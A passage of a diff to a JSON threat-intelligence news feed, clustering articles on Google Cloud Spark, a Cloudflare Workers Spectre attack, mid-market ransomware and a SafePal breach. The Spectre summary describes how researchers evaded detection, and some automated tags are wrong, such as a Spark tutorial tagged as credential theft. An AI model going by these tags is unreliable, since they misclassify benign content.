launching Spark workloads on Managed Service for Apache Spark, the first major decision point is evaluating whether to construct traditional managed clusters or transition to a zero-management, serverless infrastructure footprint. Decision #1: Managed clusters vs. serverless *Created using Nano Banana 2 in Gemini Enterprise Agent Platform Choosing between traditional Managed Spark clusters and serverless depends on ecosystem requirements, infrastructure control needs, and financial utilization patterns: Workload frequency, latency sensitive workloads & financial fit: For continuous, highly predictable, 24/7 streaming or batch processing pipelines where cluster nodes maintain constant high utilization baselines (80%+) or when the workflow’s accumulated startup time risk meeting SLA target, a permanently running, finely tuned traditional cluster, with custom YARN autoscaling rules, can sometimes be more cost-predictable. Conversely, for intermittent, bursty, ad-hoc, or orchestrator-triggered pipelines, Managed Spark serverless is highly optimal, eliminating operational management, requiring less planning time and ensuring you don’t pay for idle compute time. Ecosystem & component requirements: Managed Spark serverless is strictly optimized for Apache Spark 3.x+ codebases. If your processing pipeline relies on other ecosystem components such as Apache Flink, Presto/Trino, Hive LLAP, or Apache HBase, or if you are locked into a legacy Spark 2.x codebase, you must use Managed Spark clusters. Infrastructure customization needs: Managed Spark serverless abstracts away the underlying virtual machine (VM) layer. If your workload mandates deep OS-level hardware tuning, custom OS initialization actions, root SSH access to instances, specific local SSD configurations, or custom machine shapes, a traditional cluster is required. Note that serverless does support custom Docker container images for bundling specific application-level libraries. Decision #2: Serverless interactive sessions vs. serverless batches *Created using Nano Banana 2 in Gemini Enterprise Agent Platform Once you select the serverless deployment mode, you must choose the appropriate execution model based on your development stage and operational requirements. Managed Service for Apache Spark provides two options for running serverless workloads: Serverless interactive sessions Interactive sessions are great for iterative and exploratory use cases. You write blocks of code, inspect intermediate DataFrames, modify variables, and generate visualizations with your dataset held warm in-memory. Primary interface : Designed for human-in-the-loop interaction. Developers execute code ",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [
-            "financial_services"
-          ],
-          "affected_products": [
-            "Google Cloud",
-            "Google/Gemini"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_2_operator",
-          "role_map": {
-            "Google Cloud": "target",
-            "Google/Gemini": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Google Cloud Security",
-          "cohort": "cloud_identity_infrastructure",
-          "title": "Serverless Apache Spark on Google Cloud: Architecture Choices & AI Troubleshooting",
-          "link": "https://cloud.google.com/blog/products/data-analytics/serverless-apache-spark-on-google-cloud-architecture-ai-troubleshooting/",
-          "published": "2026-08-19T16:00:00+00:00",
-          "summary": "In modern enterprise data engineering, Apache Spark remains a cornerstone framework for processing massive datasets at scale. However, managing infrastructure such as provisioning clusters, tuning YARN configurations, and avoiding costs for idle hardware often detracts from what matters most: building resilient data pipelines. Google Cloud addresses this operational overhead via its Managed Service for Apache Spark , offering flexible deployment modes of serverless and managed clusters tailored to specific operational needs. This technical guide walks through the architectural decision matrix for deploying Spark on Google Cloud, details resource and cost optimization techniques, and demonstrates how to apply built-in Gemini Cloud Assist to rapidly troubleshoot and resolve serverless batch pipeline failures. While there is benefit to reading these three parts in a sequence, each one can be read independently and add value to how you approach Spark development on Google Cloud. Part 1: Ch",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [
-              "financial_services"
-            ],
-            "affected_products": [
-              "Google Cloud",
-              "Google/Gemini"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_2_operator",
-            "role_map": {
-              "Google Cloud": "target",
-              "Google/Gemini": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
-          "source": "Help Net Security",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Fake Gemini installer delivers Vidar infostealer via Google Colab lure",
-          "link": "https://www.helpnetsecurity.com/2026/08/20/fake-google-gemini-installer-vidar-infostealer/",
-          "published": "2026-08-20T10:46:49+00:00",
-          "summary": "A malicious executable masquerading as a Google Gemini installer was used to deliver the Vidar infostealer on a company network in the EMEA region, according to Darktrace researchers who investigated the incident. “During the initial analysis, it was noted that the top search result for the suspicious filename associated pointed to a file hosted on Google Colab, a cloud-based Jupyter notebook platform, commonly used by developers, researchers, and data scientists to run code and machine … More → The post Fake Gemini installer delivers Vidar infostealer via Google Colab lure appeared first on Help Net Security .",
-          "taxonomy": {
-            "threat_categories": [
-              "credential_theft"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Google/Gemini"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Google/Gemini": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "afcea3ecd9",
       "priority_score": 9,
       "member_count": 1,
@@ -5639,81 +5508,6 @@
       ]
     },
     {
-      "cluster_id": "f36b4968b4",
-      "priority_score": 9,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "incident_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "The Hacker News",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Cloudflare Workers Spectre Attack Leaks JWT From Co-Located Worker at 12 Bits/Second",
-        "link": "https://thehackernews.com/2026/08/cloudflare-workers-spectre-attack-leaks.html",
-        "published": "2026-08-19T19:02:40+00:00",
-        "summary": "Cybersecurity researchers have disclosed details of a remote Spectre attack against Cloudflare Workers that leaked a JSON Web Token (JWT) from a co-located Worker in the production environment at up to 12 bits per second, 360 times the rate of an earlier attack demonstrated in 2021. The end-to-end experiment used an attacker Worker and a victim Worker controlled by the researchers,",
-        "full_body": "Cloudflare Workers Spectre Attack Leaks JWT From Co-Located Worker at 12 Bits/Second  Swati Khandelwal  Aug 19, 2026 Cloud Security / Vulnerability Cybersecurity researchers have disclosed details of a remote Spectre attack against Cloudflare Workers that leaked a JSON Web Token (JWT) from a co-located Worker in the production environment at up to 12 bits per second, 360 times the rate of an earlier attack demonstrated in 2021. The end-to-end experiment used an attacker Worker and a victim Worker controlled by the researchers, with the JWT intentionally placed in the victim's memory. The research paper stated that no customer data was accessed. Cloudflare said the attack has already been mitigated in production after it improved Dynamic Process Isolation (DyPrIs), integrated the V8 Sandbox , and deployed Memory Protection Keys (MPK)-based in-process isolation, adding that it found no indicators of active exploitation over the last three years. \"We demonstrate that the production implementation of DyPrIs was insufficient,\" the researchers said in the paper . Cloudflare Workers runs code from multiple tenants in separate V8 isolates within the same operating-system process, relying on language-level isolation instead of strict process isolation to reduce startup latency. A memory read within a shared Worker process can lead to cross-tenant leakage, according to Cloudflare . The attack requires the attacker and victim Workers to be co-located in separate V8 isolates within the same Worker process. The attacker controls valid code in its own isolate. Native code execution is outside the threat model, and the attack does not depend on a V8 software exploit or sandbox escape. Cloudflare said Workers restrict local timing sources by freezing or coarsening timers during CPU execution, and do not expose shared memory or multithreading to Worker scripts. The researchers found that WebSocket communications could provide a remote timing source, while Durable Objects could keep a single Worker isolate alive for five to more than 20 hours. DyPrIs isolates suspicious scripts into a separate process after an invocation finishes, and the researchers found that a long-lived Durable Object invocation could continue running before the isolation took place. The researchers also found that WebSocket-heavy input/output (I/O) activity increased instruction translation lookaside buffer (iTLB) activity, reducing the normalized branch-misprediction signal used by DyPrIs below its detection threshold. Cloudflare described the issue as a limitation in its DyPrIs implementation, while the paper said the two weaknesses reflected fundamental limitations of the detection approach rather than implementation oversights. The researchers said robust detection should take place during execution and use a signal that cannot be suppressed by I/O activity. The paper said the production tests were conducted on Linux servers using AMD EPYC Zen 2 and Zen 3 processors, with the researchers intentionally running measurements at night, when CPU utilization was between 10% and 25%, to observe the best possible results. The researchers said higher system load reduced the leakage rate, although slower attacks remained feasible under high load. The paper reported leakage of up to 12 bits per second at 99.16% accuracy, compared with 2 bits per minute in the earlier attack. The disclosure comes nearly five years after Cloudflare and TU Graz published research demonstrating a remote Spectre attack against Workers at 120 bits per hour and introducing DyPrIs as a defense. The earlier paper reported a 0.61% false-positive rate and concluded that DyPrIs statistically provided the same security guarantees as strict process isolation against the Spectre attacks evaluated at the time. Cloudflare published additional Workers hardening measures in September 2025. The mitigations deployed by Cloudflare are listed below - Improved DyPrIs improves the detection capabilities of the existing",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "The Hacker News",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Cloudflare Workers Spectre Attack Leaks JWT From Co-Located Worker at 12 Bits/Second",
-          "link": "https://thehackernews.com/2026/08/cloudflare-workers-spectre-attack-leaks.html",
-          "published": "2026-08-19T19:02:40+00:00",
-          "summary": "Cybersecurity researchers have disclosed details of a remote Spectre attack against Cloudflare Workers that leaked a JSON Web Token (JWT) from a co-located Worker in the production environment at up to 12 bits per second, 360 times the rate of an earlier attack demonstrated in 2021. The end-to-end experiment used an attacker Worker and a victim Worker controlled by the researchers,",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "2d052ce523",
       "priority_score": 9,
       "member_count": 1,
@@ -5865,6 +5659,81 @@
       ]
     },
     {
+      "cluster_id": "f36b4968b4",
+      "priority_score": 9,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "The Hacker News",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Cloudflare Workers Spectre Attack Leaks JWT From Co-Located Worker at 12 Bits/Second",
+        "link": "https://thehackernews.com/2026/08/cloudflare-workers-spectre-attack-leaks.html",
+        "published": "2026-08-19T19:02:40+00:00",
+        "summary": "Cybersecurity researchers have disclosed details of a remote Spectre attack against Cloudflare Workers that leaked a JSON Web Token (JWT) from a co-located Worker in the production environment at up to 12 bits per second, 360 times the rate of an earlier attack demonstrated in 2021. The end-to-end experiment used an attacker Worker and a victim Worker controlled by the researchers,",
+        "full_body": "Cloudflare Workers Spectre Attack Leaks JWT From Co-Located Worker at 12 Bits/Second  Swati Khandelwal  Aug 19, 2026 Cloud Security / Vulnerability Cybersecurity researchers have disclosed details of a remote Spectre attack against Cloudflare Workers that leaked a JSON Web Token (JWT) from a co-located Worker in the production environment at up to 12 bits per second, 360 times the rate of an earlier attack demonstrated in 2021. The end-to-end experiment used an attacker Worker and a victim Worker controlled by the researchers, with the JWT intentionally placed in the victim's memory. The research paper stated that no customer data was accessed. Cloudflare said the attack has already been mitigated in production after it improved Dynamic Process Isolation (DyPrIs), integrated the V8 Sandbox , and deployed Memory Protection Keys (MPK)-based in-process isolation, adding that it found no indicators of active exploitation over the last three years. \"We demonstrate that the production implementation of DyPrIs was insufficient,\" the researchers said in the paper . Cloudflare Workers runs code from multiple tenants in separate V8 isolates within the same operating-system process, relying on language-level isolation instead of strict process isolation to reduce startup latency. A memory read within a shared Worker process can lead to cross-tenant leakage, according to Cloudflare . The attack requires the attacker and victim Workers to be co-located in separate V8 isolates within the same Worker process. The attacker controls valid code in its own isolate. Native code execution is outside the threat model, and the attack does not depend on a V8 software exploit or sandbox escape. Cloudflare said Workers restrict local timing sources by freezing or coarsening timers during CPU execution, and do not expose shared memory or multithreading to Worker scripts. The researchers found that WebSocket communications could provide a remote timing source, while Durable Objects could keep a single Worker isolate alive for five to more than 20 hours. DyPrIs isolates suspicious scripts into a separate process after an invocation finishes, and the researchers found that a long-lived Durable Object invocation could continue running before the isolation took place. The researchers also found that WebSocket-heavy input/output (I/O) activity increased instruction translation lookaside buffer (iTLB) activity, reducing the normalized branch-misprediction signal used by DyPrIs below its detection threshold. Cloudflare described the issue as a limitation in its DyPrIs implementation, while the paper said the two weaknesses reflected fundamental limitations of the detection approach rather than implementation oversights. The researchers said robust detection should take place during execution and use a signal that cannot be suppressed by I/O activity. The paper said the production tests were conducted on Linux servers using AMD EPYC Zen 2 and Zen 3 processors, with the researchers intentionally running measurements at night, when CPU utilization was between 10% and 25%, to observe the best possible results. The researchers said higher system load reduced the leakage rate, although slower attacks remained feasible under high load. The paper reported leakage of up to 12 bits per second at 99.16% accuracy, compared with 2 bits per minute in the earlier attack. The disclosure comes nearly five years after Cloudflare and TU Graz published research demonstrating a remote Spectre attack against Workers at 120 bits per hour and introducing DyPrIs as a defense. The earlier paper reported a 0.61% false-positive rate and concluded that DyPrIs statistically provided the same security guarantees as strict process isolation against the Spectre attacks evaluated at the time. Cloudflare published additional Workers hardening measures in September 2025. The mitigations deployed by Cloudflare are listed below - Improved DyPrIs improves the detection capabilities of the existing",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "The Hacker News",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Cloudflare Workers Spectre Attack Leaks JWT From Co-Located Worker at 12 Bits/Second",
+          "link": "https://thehackernews.com/2026/08/cloudflare-workers-spectre-attack-leaks.html",
+          "published": "2026-08-19T19:02:40+00:00",
+          "summary": "Cybersecurity researchers have disclosed details of a remote Spectre attack against Cloudflare Workers that leaked a JSON Web Token (JWT) from a co-located Worker in the production environment at up to 12 bits per second, 360 times the rate of an earlier attack demonstrated in 2021. The end-to-end experiment used an attacker Worker and a victim Worker controlled by the researchers,",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "7029814c59",
       "priority_score": 9,
       "member_count": 1,
@@ -5940,6 +5809,138 @@
             "content_type": "vulnerability_disclosure",
             "confidence_tier": "tier_5_chatter",
             "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "e50251994f",
+      "priority_score": 9,
+      "member_count": 3,
+      "corroborating_source_count": 2,
+      "strong_signals": [
+        "Google Cloud",
+        "Google/Gemini"
+      ],
+      "taxonomy": {
+        "threat_categories": [
+          "credential_theft"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services"
+        ],
+        "affected_products": [
+          "Google Cloud",
+          "Google/Gemini"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_2_operator",
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Google Cloud Security",
+        "cohort": "cloud_identity_infrastructure",
+        "title": "Serverless Apache Spark on Google Cloud: Architecture Choices & AI Troubleshooting",
+        "link": "https://cloud.google.com/blog/products/data-analytics/serverless-apache-spark-on-google-cloud-architecture-ai-troubleshooting/",
+        "published": "2026-08-19T16:00:00+00:00",
+        "summary": "In modern enterprise data engineering, Apache Spark remains a cornerstone framework for processing massive datasets at scale. However, managing infrastructure such as provisioning clusters, tuning YARN configurations, and avoiding costs for idle hardware often detracts from what matters most: building resilient data pipelines. Google Cloud addresses this operational overhead via its Managed Service for Apache Spark , offering flexible deployment modes of serverless and managed clusters tailored to specific operational needs. This technical guide walks through the architectural decision matrix for deploying Spark on Google Cloud, details resource and cost optimization techniques, and demonstrates how to apply built-in Gemini Cloud Assist to rapidly troubleshoot and resolve serverless batch pipeline failures. While there is benefit to reading these three parts in a sequence, each one can be read independently and add value to how you approach Spark development on Google Cloud. Part 1: Ch",
+        "full_body": "Data Analytics Serverless Apache Spark on Google Cloud: Architecture Choices & AI Troubleshooting August 19, 2026 Lior (Leo) Ginzberg Data & Analytics Customer Engineer, Google Cloud Try Gemini Enterprise Business Edition today The front door to AI in the workplace Try now In modern enterprise data engineering, Apache Spark remains a cornerstone framework for processing massive datasets at scale. However, managing infrastructure such as provisioning clusters, tuning YARN configurations, and avoiding costs for idle hardware often detracts from what matters most: building resilient data pipelines. Google Cloud addresses this operational overhead via its Managed Service for Apache Spark , offering flexible deployment modes of serverless and managed clusters tailored to specific operational needs. This technical guide walks through the architectural decision matrix for deploying Spark on Google Cloud, details resource and cost optimization techniques, and demonstrates how to apply built-in Gemini Cloud Assist to rapidly troubleshoot and resolve serverless batch pipeline failures. While there is benefit to reading these three parts in a sequence, each one can be read independently and add value to how you approach Spark development on Google Cloud. Part 1: Choosing your Apache Spark deployment model When launching Spark workloads on Managed Service for Apache Spark, the first major decision point is evaluating whether to construct traditional managed clusters or transition to a zero-management, serverless infrastructure footprint. Decision #1: Managed clusters vs. serverless *Created using Nano Banana 2 in Gemini Enterprise Agent Platform Choosing between traditional Managed Spark clusters and serverless depends on ecosystem requirements, infrastructure control needs, and financial utilization patterns: Workload frequency, latency sensitive workloads & financial fit: For continuous, highly predictable, 24/7 streaming or batch processing pipelines where cluster nodes maintain constant high utilization baselines (80%+) or when the workflow’s accumulated startup time risk meeting SLA target, a permanently running, finely tuned traditional cluster, with custom YARN autoscaling rules, can sometimes be more cost-predictable. Conversely, for intermittent, bursty, ad-hoc, or orchestrator-triggered pipelines, Managed Spark serverless is highly optimal, eliminating operational management, requiring less planning time and ensuring you don’t pay for idle compute time. Ecosystem & component requirements: Managed Spark serverless is strictly optimized for Apache Spark 3.x+ codebases. If your processing pipeline relies on other ecosystem components such as Apache Flink, Presto/Trino, Hive LLAP, or Apache HBase, or if you are locked into a legacy Spark 2.x codebase, you must use Managed Spark clusters. Infrastructure customization needs: Managed Spark serverless abstracts away the underlying virtual machine (VM) layer. If your workload mandates deep OS-level hardware tuning, custom OS initialization actions, root SSH access to instances, specific local SSD configurations, or custom machine shapes, a traditional cluster is required. Note that serverless does support custom Docker container images for bundling specific application-level libraries. Decision #2: Serverless interactive sessions vs. serverless batches *Created using Nano Banana 2 in Gemini Enterprise Agent Platform Once you select the serverless deployment mode, you must choose the appropriate execution model based on your development stage and operational requirements. Managed Service for Apache Spark provides two options for running serverless workloads: Serverless interactive sessions Interactive sessions are great for iterative and exploratory use cases. You write blocks of code, inspect intermediate DataFrames, modify variables, and generate visualizations with your dataset held warm in-memory. Primary interface : Designed for human-in-the-loop interaction. Developers execute code ",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [
+            "financial_services"
+          ],
+          "affected_products": [
+            "Google Cloud",
+            "Google/Gemini"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_2_operator",
+          "role_map": {
+            "Google Cloud": "target",
+            "Google/Gemini": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Google Cloud Security",
+          "cohort": "cloud_identity_infrastructure",
+          "title": "Serverless Apache Spark on Google Cloud: Architecture Choices & AI Troubleshooting",
+          "link": "https://cloud.google.com/blog/products/data-analytics/serverless-apache-spark-on-google-cloud-architecture-ai-troubleshooting/",
+          "published": "2026-08-19T16:00:00+00:00",
+          "summary": "In modern enterprise data engineering, Apache Spark remains a cornerstone framework for processing massive datasets at scale. However, managing infrastructure such as provisioning clusters, tuning YARN configurations, and avoiding costs for idle hardware often detracts from what matters most: building resilient data pipelines. Google Cloud addresses this operational overhead via its Managed Service for Apache Spark , offering flexible deployment modes of serverless and managed clusters tailored to specific operational needs. This technical guide walks through the architectural decision matrix for deploying Spark on Google Cloud, details resource and cost optimization techniques, and demonstrates how to apply built-in Gemini Cloud Assist to rapidly troubleshoot and resolve serverless batch pipeline failures. While there is benefit to reading these three parts in a sequence, each one can be read independently and add value to how you approach Spark development on Google Cloud. Part 1: Ch",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [
+              "financial_services"
+            ],
+            "affected_products": [
+              "Google Cloud",
+              "Google/Gemini"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_2_operator",
+            "role_map": {
+              "Google Cloud": "target",
+              "Google/Gemini": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Help Net Security",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Fake Gemini installer delivers Vidar infostealer via Google Colab lure",
+          "link": "https://www.helpnetsecurity.com/2026/08/20/fake-google-gemini-installer-vidar-infostealer/",
+          "published": "2026-08-20T10:46:49+00:00",
+          "summary": "A malicious executable masquerading as a Google Gemini installer was used to deliver the Vidar infostealer on a company network in the EMEA region, according to Darktrace researchers who investigated the incident. “During the initial analysis, it was noted that the top search result for the suspicious filename associated pointed to a file hosted on Google Colab, a cloud-based Jupyter notebook platform, commonly used by developers, researchers, and data scientists to run code and machine … More → The post Fake Gemini installer delivers Vidar infostealer via Google Colab lure appeared first on Help Net Security .",
+          "taxonomy": {
+            "threat_categories": [
+              "credential_theft"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Google/Gemini"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Google/Gemini": "target"
+            },
             "weak_tags": {
               "products": []
             }
@@ -6810,6 +6811,231 @@
       ]
     },
     {
+      "cluster_id": "1293349fdc",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "ransomware_extortion",
+          "supply_chain"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services",
+          "manufacturing_industrial"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Infosecurity Magazine",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Three-quarters of Ransomware Attacks Target Mid-Market Firms",
+        "link": "https://www.infosecurity-magazine.com/news/threequarters-ransomware-attacks/",
+        "published": "2026-08-18T10:00:00+00:00",
+        "summary": "Black Kite finds mid-market is the sweet spot for ransomware as manufacturers are most likely to be hit",
+        "full_body": "Infosecurity Magazine Home » News » Three-quarters of Ransomware Attacks Target Mid-Market Firms Three-quarters of Ransomware Attacks Target Mid-Market Firms News 18 August 2026 Written by Phil Muncaster UK / EMEA News Reporter , Infosecurity Magazine Email Phil Follow @philmuncaster Nearly three-quarters of ransomware victims since 2023 were mid-sized organizations with $10m to $1bn in revenue, according to a new Black Kite study. The third-party risk specialist analyzed 13,336 disclosed incidents dating back to January 2023, as well as a separate security scan of 120,128 mid-market companies, to compile its new report, Mid-Market Is the Routing Target . Published on August 18, it follows the Dun & Bradstreet revenue-based definition for market size: lower mid-market at $10m-$50m, core mid-market at $50m-$500m and upper mid-market at $500m-$1bn. The report found that 73% of ransomware attacks in North America and Europe hit companies with $10m-$1bn in annual revenue, with the figure barely moving even as the volume of incidents grew by 44% between 2023 and 2025. Read more on ransomware: Verizon DBIR: Small Businesses Bearing the Brunt of Ransomware Attacks Over the reporting period, the largest share of mid-market victims sat in the lower mid-market category (54%). In absolute terms, victim numbers rose here from 1391 in 2024 to 1821 in 2025. The core mid-market accounted for the second-highest number of victims over the period, ranging from 40-45% across the three-and-a-half years. Victim count here rose from 970 to 1474 between 2024 and 2025, while in the upper mid-market category, the numbers dropped from 126 in 2023 to 45 in 2025, a decline of 65%. North America (72%) accounted for many more incidents than Europe (28%), where UK firms were the most popular target. Gaps in Security Posture Manufacturing firms were by far the most popular target for threat actors, accounting for 26% of mid-market ransomware victims, followed by professional, scientific and technical services, and construction sectors. Manufacturing businesses typically have a low tolerance for outages and hold highly sensitive information, making them an attractive target. Data released by industry body Make UK published in August revealed that almost a third of UK manufacturers (30%) experienced a cyber incident over the past year, either directly or through their supply chain. Separate data from ESET published in April found that, of UK manufacturers that suffered a cyber incident last year, almost all (95%) admit the attack had a direct impact on their business, and most (53%) suffered financial loss as a result. Supply chain disruption (44%) and missed customer or supplier commitments (39%) were also commonplace. Black Kite’s analysis of security posture across over 120,000 mid-market firms revealed some of the deficiencies which could lead to ransomware compromise. Its findings include: Over a quarter (28%) had at least one known exploited vulnerability (KEV) Over half (55%) had at least one significant patch management finding on public-facing software Nearly half (48%) carried at least one disclosed vulnerability with a CVSS score of 8.0 or higher Nearly a third (32%) had at least one stealer log finding Nearly half (47%) had missing or insufficient DMARC protection The challenge for security teams in these organizations is set to increase as AI adoption grows, Black Kite argued. “AI is accelerating how fast new vulnerabilities are discovered, and the volume is climbing toward levels no small team can triage by hand,” the report claimed. “Only a fraction of those vulnerabilities are ever exploited, but finding that fraction across a company’s own systems and its suppliers is exactly the work a mid-market team has little capacity to do.” You may also like 80% of Manufacturing Firms Have Critical Vulnerabilities News 2 October 2024 Manufacturers Struggle to Manage Cyber-Threats from New Tech Deployments News 5 December 2022 Tech Manufacturer Data I/O H",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "supply_chain"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "financial_services",
+            "manufacturing_industrial"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Infosecurity Magazine",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Three-quarters of Ransomware Attacks Target Mid-Market Firms",
+          "link": "https://www.infosecurity-magazine.com/news/threequarters-ransomware-attacks/",
+          "published": "2026-08-18T10:00:00+00:00",
+          "summary": "Black Kite finds mid-market is the sweet spot for ransomware as manufacturers are most likely to be hit",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "supply_chain"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "financial_services",
+              "manufacturing_industrial"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "20c2a82904",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "credential_theft",
+          "data_breach",
+          "phishing_social_eng",
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [
+          "Medusa"
+        ],
+        "affected_industries": [
+          "critical_infrastructure",
+          "financial_services",
+          "government",
+          "manufacturing_industrial"
+        ],
+        "affected_products": [
+          "Apple iOS/macOS",
+          "OpenAI/ChatGPT"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "preauth_unauth"
+        ],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Infosecurity Magazine",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "SafePal Data Breach Hits Tens of Thousands of Customers",
+        "link": "https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/",
+        "published": "2026-08-17T09:10:00+00:00",
+        "summary": "Nearly 40,000 customers of hardware wallet provider SafePal have been impacted by a data breach",
